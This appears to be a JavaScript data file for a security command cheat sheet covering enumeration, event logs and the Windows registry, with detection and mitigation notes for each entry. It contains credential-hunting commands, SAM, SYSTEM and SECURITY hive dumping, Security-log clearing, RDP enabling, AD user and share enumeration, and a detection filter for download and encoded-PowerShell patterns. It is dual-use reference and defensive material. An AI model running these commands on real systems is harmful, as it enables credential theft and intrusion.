  linux:`find / -perm -4000 -type f 2>/dev/null; echo "-- SGID --"; find / -perm -2000 -type f 2>/dev/null`,
  mac:`find / -perm -4000 -type f 2>/dev/null`
 }},
{id:"enum-cred-hunt", cat:"Enumeration", title:"Hunt for stored credentials",
 desc:"Search common locations for secrets — key files, configs, and shell histories.",
 danger:"Authorized engagements only; may surface real secrets — handle per rules of engagement.",
 team:"red", tags:["enumeration","password"], attack:["T1552.001"],
 detect:"Bulk recursive reads/greps of home and config dirs; file-access spikes; EDR credential-access analytics.",
 mitigate:"Use a secrets manager; never store plaintext creds; restrict file permissions; clear histories.",
 code:{
  ps:`Get-ChildItem $env:USERPROFILE -Recurse -Include *.kdbx,*.ppk,id_rsa,*.pem,unattend.xml -ErrorAction SilentlyContinue | Select-Object FullName`,
  linux:`grep -rIl -e password -e secret -e api_key /home /etc 2>/dev/null | head
ls -la ~/.aws ~/.ssh ~/.config 2>/dev/null; grep -Ei 'pass|token|key' ~/.*_history 2>/dev/null | head`,
  mac:`ls -la ~/.aws ~/.ssh 2>/dev/null; grep -Ei 'pass|token|key' ~/.*_history 2>/dev/null | head`
 }},
{id:"enum-av-edr", cat:"Enumeration", title:"Installed security products (Windows)",
 desc:"Identify AV/EDR present to understand monitoring before acting.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","detection"], attack:["T1518.001"],
 detect:"Queries to SecurityCenter2 / enumeration of security services can itself be an EDR signal.",
 mitigate:"Tamper protection on EDR; alert on security-product enumeration.",
 code:{
  ps:`Get-CimInstance -Namespace root/SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, productState
Get-Service | Where-Object { $_.DisplayName -match 'Defender|CrowdStrike|Carbon Black|SentinelOne|Cylance|Sophos|McAfee|Cortex' }`
 }},
{id:"enum-tokens", cat:"Enumeration", title:"Abusable privileges (Windows)",
 desc:"Check for privileges that enable escalation (SeImpersonate, SeDebug, SeBackup, etc.).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","privesc"], attack:["T1134"],
 detect:"whoami /priv is low-signal; subsequent token abuse is the detectable event.",
 mitigate:"Minimize privilege assignments; monitor for token-manipulation behavior.",
 code:{
  ps:`whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken SeDebug SeBackup SeRestore SeTakeOwnership"`
 }},
{id:"enum-domain-native", cat:"Enumeration", title:"Native AD enumeration (domain-joined)",
 desc:"Enumerate the domain from a joined host using only built-in tools (no extra binaries).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","active-directory","account"], attack:["T1087.002","T1482"],
 detect:"net.exe / nltest against a DC; spikes of SAMR/LDAP from a workstation.",
 mitigate:"Restrict anonymous/authenticated enumeration; monitor SAMR/LDAP; tiered admin.",
 code:{
  ps:`nltest /dclist:{{DOMAIN:example.com}}
net group "Domain Admins" /domain
net accounts /domain`,
  cmd:`nltest /dclist:{{DOMAIN:example.com}}
net group "Domain Admins" /domain`
 }},
{id:"enum-ldap", cat:"Enumeration", title:"LDAP / AD enumeration (ldapsearch)",
 desc:"Query Active Directory over LDAP for users and attributes. Requires ldap-utils.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","active-directory","ldap"], attack:["T1087.002"],
 detect:"High-volume LDAP queries from a non-admin host; DC 1644 verbose search logging.",
 mitigate:"Limit LDAP read scope; alert on bulk queries; LDAP signing/channel binding.",
 code:{
  linux:`ldapsearch -x -H ldap://{{DC:10.0.0.10}} -b "dc=example,dc=com" -D "{{USER:user@example.com}}" -w '{{PASS:}}' "(objectClass=user)" sAMAccountName`,
  mac:`ldapsearch -x -H ldap://{{DC:10.0.0.10}} -b "dc=example,dc=com" -D "{{USER:user@example.com}}" -w '{{PASS:}}' "(objectClass=user)" sAMAccountName`
 }},
{id:"enum-kerbrute", cat:"Enumeration", title:"Kerberos username enumeration",
 desc:"Validate domain usernames via Kerberos pre-auth (AS-REQ) without triggering lockouts. Requires kerbrute.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","active-directory","account"], attack:["T1087"],
 detect:"Many Kerberos 4768/4771 pre-auth failures for distinct usernames from one source.",
 mitigate:"Alert on 4768/4771 spikes; account-name hygiene; honeytokens.",
 code:{
  linux:`kerbrute userenum -d {{DOMAIN:example.com}} --dc {{DC:10.0.0.10}} {{WORDLIST:users.txt}}`
 }},
{id:"enum-smbmap", cat:"Enumeration", title:"SMB share access mapping",
 desc:"Enumerate reachable SMB shares and your access level across hosts. Requires smbmap (or crackmapexec).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","smb"], attack:["T1135"],
 detect:"Authenticated SMB tree connects across many hosts; Windows 5140 share access.",
 mitigate:"Least-privilege share ACLs; SMB signing; alert on wide share access.",
 code:{
  linux:`smbmap -H {{IP:10.0.0.5}} -u {{USER:guest}} -p ''   # or: crackmapexec smb {{TARGET:10.0.0.0/24}} --shares`,
  mac:`smbmap -H {{IP:10.0.0.5}} -u {{USER:guest}} -p ''`
 }},
{id:"enum-crackmapexec", cat:"Enumeration", title:"Multi-protocol enumeration (CME/NetExec)",
 desc:"Sweep SMB/LDAP/WinRM across a range for shares, users, and access. Requires crackmapexec/netexec.",
 danger:"Authorized engagements only; credential use can trigger lockouts.",
 team:"red", tags:["enumeration","smb","active-directory"], attack:["T1135","T1087"],
 detect:"Same credential authenticating to many hosts rapidly; 4624/4625 and 5140 bursts.",
 mitigate:"Lockout policy; MFA; alert on lateral auth patterns; LAPS.",
 code:{
  linux:`crackmapexec smb {{TARGET:10.0.0.0/24}} -u {{USER:user}} -p '{{PASS:}}' --shares --users`
 }},
{id:"enum-nfs", cat:"Enumeration", title:"NFS exports",
 desc:"List NFS shares a host exports (often world-readable).",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","network"], attack:["T1135"],
 detect:"showmount/RPC mountd queries in server logs.",
 mitigate:"Restrict exports by host; use Kerberos NFS; avoid no_root_squash.",
 code:{
  linux:`showmount -e {{IP:10.0.0.5}}`,
  mac:`showmount -e {{IP:10.0.0.5}}`
 }},
{id:"enum-passpol", cat:"Enumeration", title:"Password & lockout policy",
 desc:"Read the account policy to plan spraying without triggering lockouts.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","account"], attack:["T1201"],
 detect:"Policy reads are low-signal; the follow-on spray is the detectable event (4625 bursts).",
 mitigate:"Sensible lockout thresholds; MFA; alert on distributed auth failures.",
 code:{
  ps:`net accounts`,
  linux:`grep -E '^PASS_' /etc/login.defs; grep -h faillock /etc/pam.d/* 2>/dev/null | sort -u`,
  mac:`pwpolicy getaccountpolicies 2>/dev/null | tail -n +2`
 }},
{id:"enum-mounts", cat:"Enumeration", title:"Drives, mounts & mapped shares",
 desc:"Enumerate local volumes, removable media, and mapped network drives for data and pivots.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration"], attack:["T1120","T1135"],
 detect:"Low-signal; correlate with subsequent access to mapped/removable media.",
 mitigate:"Restrict removable media; least-privilege share mappings.",
 code:{
  ps:`Get-PSDrive -PSProvider FileSystem
Get-CimInstance Win32_MappedLogicalDisk | Select-Object Name, ProviderName`,
  mac:`mount; diskutil list`,
  linux:`mount; lsblk`
 }},
{id:"enum-history", cat:"Enumeration", title:"Shell history for secrets",
 desc:"Mine command history for credentials, tokens, and useful commands.",
 danger:"Authorized engagements only.",
 team:"red", tags:["enumeration","password"], attack:["T1552.003"],
 detect:"Reads of history files; EDR credential-access analytics.",
 mitigate:"Disable/limit history for sensitive shells; never pass secrets on the command line.",
 code:{
  ps:`Get-Content (Get-PSReadLineOption).HistorySavePath -Tail 200 | Select-String -Pattern 'pass|cred|token|-key|ConvertTo-SecureString'`,
  linux:`grep -Ei 'pass|token|secret|-key|curl .*-u ' ~/.bash_history ~/.zsh_history 2>/dev/null`,
  mac:`grep -Ei 'pass|token|secret|-key|curl .*-u ' ~/.zsh_history ~/.bash_history 2>/dev/null`
 }},

/* ================= EVENT LOGS ================= */
 {"id":"evt-winevent-list-logs","cat":"Event Logs","title":"List event logs with record counts","desc":"Enumerate every Windows event log channel and how many records each holds.","tags":["logs","windows","reference"],"code":{"ps":"Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | Where-Object RecordCount -gt 0 | Sort-Object RecordCount -Descending | Select-Object LogName, RecordCount, LastWriteTime"}},
 {"id":"evt-winevent-recent","cat":"Event Logs","title":"Read most recent events from a log","desc":"Pull the newest N entries from any channel for fast triage.","tags":["logs","windows","triage"],"code":{"ps":"Get-WinEvent -LogName System -MaxEvents 50 | Format-Table TimeCreated, Id, LevelDisplayName, ProviderName -AutoSize","cmd":"wevtutil qe System /c:50 /rd:true /f:text"}},
 {"id":"evt-winevent-filterhashtable","cat":"Event Logs","title":"Server-side filter with FilterHashtable","desc":"Fast, indexed query by log, event ID, level, and time window (filtering happens in the log service, not PowerShell).","tags":["logs","windows","reference"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).AddDays(-{{DAYS:7}})} | Format-List TimeCreated, Id, Message"}},
 {"id":"evt-winevent-xpath","cat":"Event Logs","title":"Query events with XPath","desc":"Use XPath expressions for precise field-level filtering across data elements.","tags":["logs","windows","reference"],"code":{"ps":"Get-WinEvent -LogName Security -FilterXPath \"*[System[(EventID=4624)]] and *[EventData[Data[@Name='LogonType']='10']]\" -MaxEvents 20","cmd":"wevtutil qe Security /q:\"*[System[(EventID=4624)]]\" /c:20 /f:text"}},
 {"id":"evt-wevtutil-query","cat":"Event Logs","title":"Query a log with wevtutil (no PowerShell)","desc":"Native CMD log query, useful on hosts where PowerShell is restricted.","tags":["logs","windows","quick-win"],"code":{"cmd":"wevtutil qe Application /c:20 /rd:true /f:text /q:\"*[System[(Level=2)]]\""}},
 {"id":"evt-wevtutil-export","cat":"Event Logs","title":"Export an event log to .evtx","desc":"Preserve a full channel to a portable .evtx file for offline analysis or evidence.","danger":"Reading the Security log requires administrator rights. Store exports on evidence media and preserve chain of custody.","tags":["logs","windows","forensics"],"code":{"cmd":"wevtutil epl Security C:\\evidence\\{{HOST:host}}-security.evtx","ps":"wevtutil epl Security \"C:\\evidence\\{{HOST:host}}-security.evtx\""}},
 {"id":"evt-wevtutil-clear","cat":"Event Logs","title":"Clear an event log (and back it up first)","desc":"Clears a channel; use /bu to archive to .evtx before wiping. Clearing generates event 1102/104.","danger":"Destroys log history and requires admin. Clearing Security logs is a classic anti-forensic action (T1070.001) and is itself audited as event 1102.","team":"blue","attack":["T1070.001"],"detect":"The clear operation writes Security 1102 (audit log cleared) or System 104 (log cleared) with the account that performed it.","mitigate":"Forward logs to a central SIEM/collector in real time so a local clear cannot erase the copy; alert on 1102/104.","tags":["logs","windows","incident-response"],"code":{"cmd":"wevtutil cl Security /bu:C:\\evidence\\security-preclear.evtx"}},
 {"id":"evt-winevent-failed-4625","cat":"Event Logs","title":"Failed logons (Event 4625)","desc":"List failed authentication attempts; a burst signals password guessing or spraying.","danger":"Requires administrator rights to read the Security log.","team":"blue","attack":["T1110"],"detect":"Many 4625 events for one account (guessing) or one attempt each across many accounts (spraying); pivot on Sub Status code and source IP.","mitigate":"Enforce account lockout thresholds, MFA, and strong passwords; block/geo-fence exposed RDP and SMB.","tags":["logs","account","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)} | Group-Object {$_.Properties[5].Value} | Sort-Object Count -Descending | Select-Object Count, Name"}},
 {"id":"evt-winevent-lockout-4740","cat":"Event Logs","title":"Account lockouts (Event 4740)","desc":"Show which accounts were locked out and from which source workstation.","danger":"Requires administrator rights on a domain controller / the auditing host.","team":"blue","attack":["T1110"],"detect":"Repeated 4740 for the same account, or many accounts locking simultaneously, indicates brute force or a stale credential looping.","mitigate":"Investigate the Caller Computer Name field; rotate exposed credentials; tune lockout policy to slow guessing without enabling DoS.","tags":["logs","account","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4740} -MaxEvents 50 | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-log-cleared-1102","cat":"Event Logs","title":"Detect Security log clearing (Event 1102)","desc":"Find when the Security log was cleared and by whom (paired System event is 104).","danger":"Requires administrator rights to read the Security log.","team":"blue","attack":["T1070.001"],"detect":"Any 1102 (Security) or 104 (System) is high-signal: legitimate clears are rare, so treat unexplained ones as possible anti-forensics.","mitigate":"Ship logs off-host to a WEF collector or SIEM immediately; alert on 1102/104; restrict the 'Manage auditing and security log' right.","tags":["logs","windows","incident-response"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=1102} | Format-List TimeCreated, Message; Get-WinEvent -FilterHashtable @{LogName='System'; Id=104} | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-service-7045","cat":"Event Logs","title":"New service installs (Event 7045)","desc":"List newly installed services; a common persistence and lateral-movement footprint.","team":"blue","attack":["T1543.003"],"detect":"7045 with a random/short service name, a binary in a temp/user path, or 'demand start' + LocalSystem is suspicious (e.g. PsExec drops PSEXESVC).","mitigate":"Baseline expected services; alert on service creation from unusual paths; restrict admin rights that allow service install.","tags":["logs","persistence","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045; StartTime=(Get-Date).AddDays(-7)} | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-scriptblock-4104","cat":"Event Logs","title":"PowerShell script block logging (Event 4104)","desc":"Read deobfuscated PowerShell captured by script block logging (Microsoft-Windows-PowerShell/Operational).","team":"blue","attack":["T1059.001"],"detect":"4104 records containing IEX, DownloadString, FromBase64String, -enc, or reflective load patterns indicate offensive tooling.","mitigate":"Enable script block and module logging via GPO; enforce Constrained Language Mode and application control (WDAC/AppLocker).","tags":["logs","detection","windows"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104} -MaxEvents 40 | Where-Object { $_.Message -match 'FromBase64String|DownloadString|-enc' } | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-process-4688","cat":"Event Logs","title":"Process creation auditing (Event 4688)","desc":"List created processes with parent/child lineage. Requires 'Audit Process Creation' (and command-line auditing GPO for full args).","danger":"Requires administrator rights to read the Security log.","team":"blue","attack":["T1059"],"detect":"Suspicious parent/child chains (e.g. winword.exe or w3wp.exe spawning cmd.exe/powershell.exe) and living-off-the-land binaries surface here.","mitigate":"Enable process-creation and command-line auditing fleet-wide; forward to SIEM; layer Sysmon Event ID 1 for richer detail.","tags":["logs","process","detection"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688; StartTime=(Get-Date).AddHours(-6)} | Format-List TimeCreated, Message"}},
 {"id":"evt-winevent-export-csv","cat":"Event Logs","title":"Export events to CSV for timelining","desc":"Flatten selected events to CSV for spreadsheet or SIEM ingestion and timeline building.","tags":["logs","timeline","windows"],"code":{"ps":"Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625,4634} -MaxEvents 500 | Select-Object TimeCreated, Id, @{N='Msg';E={$_.Message -replace '\\r?\\n',' '}} | Export-Csv -NoTypeInformation -Path .\\logon-timeline.csv"}},
 {"id":"evt-journalctl-recent","cat":"Event Logs","title":"Recent journald entries","desc":"Read the tail of the systemd journal without a pager for quick triage.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -n 100 --no-pager"}},
 {"id":"evt-journalctl-time","cat":"Event Logs","title":"Journald time-window filter","desc":"Bound journal output to a start/end time for incident timelining.","tags":["logs","linux","timeline"],"code":{"linux":"journalctl --since \"{{START:2026-07-01 00:00:00}}\" --until \"{{END:2026-07-02 00:00:00}}\" --no-pager"}},
 {"id":"evt-journalctl-unit","cat":"Event Logs","title":"Journald logs for one service","desc":"Show journal entries for a specific systemd unit.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -u {{UNIT:ssh.service}} -n 50 --no-pager"}},
 {"id":"evt-journalctl-boot-priority","cat":"Event Logs","title":"Errors from the current boot","desc":"Filter the journal by priority for this boot; list boots to target a previous session.","tags":["logs","linux","triage"],"code":{"linux":"journalctl -b -p err --no-pager; journalctl --list-boots"}},
 {"id":"evt-journalctl-export-json","cat":"Event Logs","title":"Export journald as JSON","desc":"Emit structured journal records for parsing or SIEM ingestion.","tags":["logs","linux","forensics"],"code":{"linux":"journalctl -u {{UNIT:ssh.service}} --since today -o json --no-pager > journal-export.json"}},
 {"id":"evt-journalctl-failed-ssh","cat":"Event Logs","title":"Failed SSH logins from journald","desc":"Surface failed SSH authentications; a spike signals brute force or spraying.","team":"blue","attack":["T1110"],"detect":"Many 'Failed password' or 'Invalid user' lines from one source IP, or one attempt across many usernames, indicates credential attacks.","mitigate":"Deploy fail2ban/sshd MaxAuthTries, enforce key-only auth, and restrict SSH exposure with a firewall or bastion.","tags":["logs","linux","account"],"code":{"linux":"journalctl -u ssh.service --since \"-24h\" --no-pager | grep -aE 'Failed password|Invalid user'"}},
 {"id":"evt-login-history-last","cat":"Event Logs","title":"Login history from wtmp/btmp","desc":"Show successful (last) and failed (lastb, root) interactive logins. BSD and GNU last differ in count syntax.","danger":"lastb reads /var/log/btmp and requires root.","tags":["logs","account","cross-platform"],"code":{"linux":"last -a -n 20; sudo lastb -a -n 20","mac":"last -20"}},
 {"id":"evt-macos-log-show","cat":"Event Logs","title":"macOS unified log: time window","desc":"Query the macOS unified log over a recent interval with a predicate filter.","tags":["logs","macos","triage"],"code":{"mac":"log show --last {{WINDOW:1h}} --predicate 'process == \"{{PROCESS:sshd}}\"' --info"}},
 {"id":"evt-macos-log-stream","cat":"Event Logs","title":"macOS unified log: live stream","desc":"Tail the macOS unified log in real time, filtered by a predicate.","tags":["logs","macos","quick-win"],"code":{"mac":"log stream --predicate 'subsystem == \"{{SUBSYSTEM:com.apple.securityd}}\"' --level info"}},
 {"id":"evt-macos-log-sshd","cat":"Event Logs","title":"macOS failed SSH/auth in unified log","desc":"Inspect authentication activity in the macOS unified log for signs of guessing.","team":"blue","attack":["T1110"],"detect":"Repeated sshd 'Failed password'/'authentication failure' entries, or opendirectoryd auth failures, indicate password attacks against the Mac.","mitigate":"Disable Remote Login if unused, require SSH keys, enable the application firewall, and enroll the host in MDM logging/EDR.","tags":["logs","macos","account"],"code":{"mac":"log show --last 24h --predicate 'process == \"sshd\"' --info | grep -iE 'failed|invalid|authentication'"}},

/* ================= WINDOWS REGISTRY ================= */
 {"id":"reg-query-key","cat":"Windows Registry","title":"Query a registry key","desc":"Read all values under one key with built-in reg.exe or the PowerShell registry provider.","tags":["registry","windows","quick-win"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"","ps":"Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'"}},
 {"id":"reg-query-recursive","cat":"Windows Registry","title":"Recurse a subtree","desc":"Dump every subkey and value beneath a path (/s in reg.exe, -Recurse in PowerShell).","tags":["registry","windows","enumeration"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\{{VENDOR:Microsoft}}\" /s","ps":"Get-ChildItem -Path 'HKLM:\\SOFTWARE\\{{VENDOR:Microsoft}}' -Recurse -ErrorAction SilentlyContinue"}},
 {"id":"reg-search-data","cat":"Windows Registry","title":"Search for a string in the registry","desc":"Find keys, value names, or REG_SZ data matching a term across a hive with reg query /f.","tags":["registry","windows","recon"],"code":{"cmd":"reg query HKLM /f \"{{TERM:password}}\" /s /t REG_SZ"}},
 {"id":"reg-add-value","cat":"Windows Registry","title":"Create or set a value","desc":"Write a value with reg add or New-ItemProperty (HKLM/HKCR need an elevated prompt).","danger":"Writes to the registry; HKLM changes require Administrator and can break configuration. Test in HKCU first.","tags":["registry","windows"],"code":{"cmd":"reg add \"HKCU\\Software\\{{APP:MyApp}}\" /v {{NAME:Setting}} /t REG_SZ /d \"{{DATA:value}}\" /f","ps":"New-Item -Path 'HKCU:\\Software\\{{APP:MyApp}}' -Force | Out-Null; New-ItemProperty -Path 'HKCU:\\Software\\{{APP:MyApp}}' -Name '{{NAME:Setting}}' -Value '{{DATA:value}}' -PropertyType String -Force"}},
 {"id":"reg-delete-value","cat":"Windows Registry","title":"Delete a value or key","desc":"Remove a single value (/v) or an entire key with reg delete or Remove-ItemProperty.","danger":"Destructive and irreversible without a backup. Export the key first (reg export). HKLM deletions need Administrator.","tags":["registry","windows"],"code":{"cmd":"reg delete \"HKCU\\Software\\{{APP:MyApp}}\" /v {{NAME:Setting}} /f","ps":"Remove-ItemProperty -Path 'HKCU:\\Software\\{{APP:MyApp}}' -Name '{{NAME:Setting}}'"}},
 {"id":"reg-ps-read-value","cat":"Windows Registry","title":"Read one value programmatically","desc":"Pull a single value into a variable via PowerShell or Python's stdlib winreg module (Windows only).","tags":["registry","windows","automation"],"code":{"ps":"(Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName).ProductName","py":"import winreg\nk = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion')\nval, _ = winreg.QueryValueEx(k, 'ProductName')\nprint(val)"}},
 {"id":"reg-ps-set-value","cat":"Windows Registry","title":"Set a value with the PowerShell provider","desc":"Modify an existing value in place with Set-ItemProperty.","danger":"Overwrites live configuration. HKLM paths require an elevated session; confirm the type matches the existing value.","tags":["registry","windows","automation"],"code":{"ps":"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value 'C:\\{{PATH:image.jpg}}'"}},
 {"id":"reg-export","cat":"Windows Registry","title":"Export a key to a .reg file","desc":"Snapshot a key to a text .reg backup before editing (reg export, /y to overwrite).","tags":["registry","windows","backup"],"code":{"cmd":"reg export \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" C:\\run-backup.reg /y"}},
 {"id":"reg-import","cat":"Windows Registry","title":"Import a .reg file","desc":"Merge a previously exported .reg file back into the registry with reg import.","danger":"Silently overwrites existing values with no confirmation. Inspect the .reg contents first; HKLM merges need Administrator.","tags":["registry","windows","recovery"],"code":{"cmd":"reg import C:\\run-backup.reg"}},
 {"id":"reg-save-hive","cat":"Windows Registry","title":"Save a live hive to a binary file","desc":"Write a loaded key/hive to a binary .hiv snapshot with reg save (preserves ACLs and types).","danger":"Requires Administrator (SeBackupPrivilege). Store the binary snapshot securely; it may contain sensitive configuration.","tags":["registry","windows","backup","forensics"],"code":{"cmd":"reg save \"HKLM\\SOFTWARE\" C:\\SOFTWARE.hiv /y"}},
 {"id":"reg-dump-cred-hives","cat":"Windows Registry","title":"Save SAM/SYSTEM/SECURITY hives","desc":"Copy the credential-bearing hives offline for secretsdump-style extraction (reg save).","team":"purple","danger":"AUTHORIZED USE ONLY. SAM+SYSTEM together enable offline local hash extraction. Requires Administrator; treat the files as live credentials.","attack":["T1003.002"],"detect":"reg.exe with SAM/SECURITY/SYSTEM arguments in Security 4688 / Sysmon Event ID 1 command lines; new .hiv/.save files; use of SeBackupPrivilege (4673/4674).","mitigate":"Restrict local Administrator, enable Credential Guard, monitor reg save against protected hives, and alert on any process opening \\Registry\\Machine\\SAM.","tags":["registry","windows","password","post-ex"],"code":{"cmd":"reg save HKLM\\SAM C:\\sam.save /y\nreg save HKLM\\SYSTEM C:\\system.save /y\nreg save HKLM\\SECURITY C:\\security.save /y"}},
 {"id":"reg-load-offline-hive","cat":"Windows Registry","title":"Mount an offline hive for analysis","desc":"Load a dead-box or captured hive file into a temporary key, then unload it (reg load/unload).","team":"blue","danger":"Requires Administrator. Always reg unload when finished; a stuck mount can lock the source file.","tags":["registry","windows","forensics","triage"],"code":{"cmd":"reg load HKLM\\Offline C:\\evidence\\SOFTWARE\nreg query \"HKLM\\Offline\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg unload HKLM\\Offline"}},
 {"id":"reg-run-keys","cat":"Windows Registry","title":"Audit Run / RunOnce autostart keys","desc":"Enumerate the classic per-machine and per-user autorun keys for persistence.","team":"purple","danger":"AUTHORIZED USE ONLY. Reading is safe; adding an entry here establishes persistence and needs authorization.","attack":["T1547.001"],"detect":"Sysmon Event ID 13 (RegistryValueSet) on Run/RunOnce paths; Autoruns diffs; Security 4657 with registry auditing enabled.","mitigate":"Baseline expected autoruns, block untrusted binaries with WDAC/AppLocker, and alert on new values written to Run/RunOnce.","tags":["registry","windows","persistence","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nreg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"","ps":"'HKLM:','HKCU:' | ForEach-Object { Get-ItemProperty \"$_\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" -ErrorAction SilentlyContinue }"}},
 {"id":"reg-winlogon-persistence","cat":"Windows Registry","title":"Inspect Winlogon Userinit / Shell","desc":"Check Winlogon Userinit and Shell values, a common logon-persistence hijack point.","team":"purple","danger":"AUTHORIZED USE ONLY. Appending a binary to Userinit/Shell runs it at every logon; modification requires Administrator.","attack":["T1547.004"],"detect":"Userinit not equal to 'C:\\Windows\\system32\\userinit.exe,' or Shell not equal to 'explorer.exe'; Sysmon Event ID 13 on the Winlogon key.","mitigate":"Lock the Winlogon key ACL, alert on any change to Userinit/Shell, and compare against a known-good baseline.","tags":["registry","windows","persistence","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell"}},
 {"id":"reg-ifeo-debugger","cat":"Windows Registry","title":"Hunt Image File Execution Options debuggers","desc":"Enumerate IFEO Debugger values that silently launch a process when a target .exe starts.","team":"purple","danger":"AUTHORIZED USE ONLY. A Debugger value hijacks execution of the named binary (and enables accessibility-tool bypass). Writing needs Administrator.","attack":["T1546.012"],"detect":"Unexpected Debugger values under Image File Execution Options; Sysmon Event ID 13; parent-process anomalies where a debugger spawns instead of the target.","mitigate":"Audit the IFEO key, alert on any Debugger value, and restrict who can write under HKLM\\...\\Image File Execution Options.","tags":["registry","windows","persistence","privesc"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" /s /f Debugger"}},
 {"id":"reg-appinit-dlls","cat":"Windows Registry","title":"Check AppInit_DLLs","desc":"Read AppInit_DLLs and LoadAppInit_DLLs, a legacy DLL-injection-into-every-GUI-process vector.","team":"purple","danger":"AUTHORIZED USE ONLY. A populated AppInit_DLLs with LoadAppInit_DLLs=1 loads that DLL into most user32 processes. Writing needs Administrator.","attack":["T1546.010"],"detect":"Non-empty AppInit_DLLs; LoadAppInit_DLLs flipped to 1; Sysmon Event ID 13 on the Windows key and Event ID 7 (image loaded) for the injected DLL.","mitigate":"Keep Secure Boot on (AppInit is ignored when enabled), set LoadAppInit_DLLs=0, and alert on changes to the value.","tags":["registry","windows","persistence","detection"],"code":{"cmd":"reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs"}},
 {"id":"reg-services-persistence","cat":"Windows Registry","title":"Review service registry entries","desc":"Inspect a service's ImagePath and Start type under CurrentControlSet\\Services for tampering.","team":"purple","danger":"AUTHORIZED USE ONLY. Editing ImagePath or Start (0/2 = auto) creates or hijacks a service for persistence/privesc; requires Administrator.","attack":["T1543.003"],"detect":"Security 4697/7045 (new service installed); Sysmon Event ID 13 on Services keys; ImagePath pointing at unusual paths, scripts, or unquoted paths with spaces.","mitigate":"Restrict service-config rights, alert on new/modified services, and validate binary signatures for auto-start services.","tags":["registry","windows","persistence","privesc"],"code":{"cmd":"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\{{SVC:Spooler}}\" /v ImagePath\nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\{{SVC:Spooler}}\" /v Start"}},
 {"id":"reg-rdp-enable","cat":"Windows Registry","title":"Enable Remote Desktop via registry","desc":"Flip fDenyTSConnections to 0 to allow inbound RDP (query is safe; the add enables it).","team":"purple","danger":"AUTHORIZED USE ONLY. Enabling RDP opens a remote-access surface; requires Administrator and a matching firewall rule. Common lateral-movement setup step.","attack":["T1021.001"],"detect":"Sysmon Event ID 13 on fDenyTSConnections; firewall rule changes; Security 4624 Type 10 (RemoteInteractive) logons after the change.","mitigate":"Keep RDP disabled where unused, gate it behind NLA + VPN/jump host, and alert on fDenyTSConnections flipping to 0.","tags":["registry","windows","remote","post-ex"],"code":{"cmd":"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"}},
